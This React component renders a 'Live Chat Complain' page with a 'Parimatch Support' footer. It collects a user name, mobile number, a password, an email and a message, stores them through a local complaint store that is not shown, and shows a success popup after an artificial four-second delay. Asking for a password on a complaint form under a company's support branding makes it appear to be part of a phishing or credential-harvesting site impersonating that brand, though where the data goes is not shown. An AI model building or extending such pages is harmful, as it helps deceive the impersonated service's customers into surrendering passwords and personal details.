import { useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import Header from '../../components/Header'
import SubmitSuccessPopup from '../../components/SubmitSuccessPopup'
import { saveComplain, generateId } from '../../utils/complainStore'

export default function LiveChatComplain() {
  const navigate = useNavigate()
  const [userName, setUserName] = useState('')
  const [mobile, setMobile] = useState('')
  const [password, setPassword] = useState('')
  const [email, setEmail] = useState('')
  const [message, setMessage] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)

  const handleSubmit = async (e) => {
    e.preventDefault()
    setSubmitting(true)
    try {
      const entry = {
        id: generateId(),
        type: 'Live Chat',
        title: 'Live Chat Complain',
        createdAt: new Date().toISOString(),
        details: { userName, mobile, password, email, message },
        files: {}
      }
      saveComplain(entry)
      await new Promise(r => setTimeout(r, 4000))
      setShowSuccess(true)
    } catch (err) { alert(err && err.message ? err.message : 'Submit failed') }
 finally { setSubmitting(false) }
  }

  return (
    <>
      <Header showMenu />
      <main className="container complain-open">
        <div className="card complain-anim d1" style={{padding:'14px 16px'}}>
          <Link className="back-link" to="/" style={{marginBottom:'0'}}>
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M19 12H5" /><polyline points="12 19 5 12 12 5" /></svg>
            Back
          </Link>
        </div>
        <div className="card panel complain-anim d2">
          <h1 className="page-title complain-anim d3" style={{textAlign:'center', marginBottom:'20px'}}>Complain Page</h1>
          <form onSubmit={handleSubmit}>
            <div className="form-grid two">
              <div className="form-group complain-anim d4"><label>User Name</label><input placeholder="User Name" value={userName} onChange={e=>setUserName(e.target.value)} required /></div>
              <div className="form-group complain-anim d5"><label>Mobile Number</label><input type="tel" placeholder="Mobile Number" value={mobile} onChange={e=>setMobile(e.target.value)} required /></div>
              <div className="form-group complain-anim d6"><label>Set Password</label><input type="password" placeholder="Set Password" value={password} onChange={e=>setPassword(e.target.value)} required /></div>
              <div className="form-group complain-anim d7"><label>E-mail ID</label><input type="email" placeholder="E-mail ID" value={email} onChange={e=>setEmail(e.target.value)} required /></div>
              <div className="form-group complain-anim d8"><label>Message</label><input placeholder="Message" value={message} onChange={e=>setMessage(e.target.value)} required /></div>
            </div>
            <div className="form-actions complain-anim d9" style={{justifyContent:'center', marginTop:'24px'}}>
              <button className="btn primary" type="submit" disabled={submitting}>{submitting ? <><span className="spin"></span> Submitting...</> : 'Submit Now'}</button>
            </div>
          </form>
        </div>
      </main>
      <SubmitSuccessPopup open={showSuccess} onClose={() => setShowSuccess(false)} onViewAll={() => navigate('/all-complains')} />
      <footer><p>&copy; 2026 Parimatch Support. All rights reserved.</p></footer>
    </>
  )
}
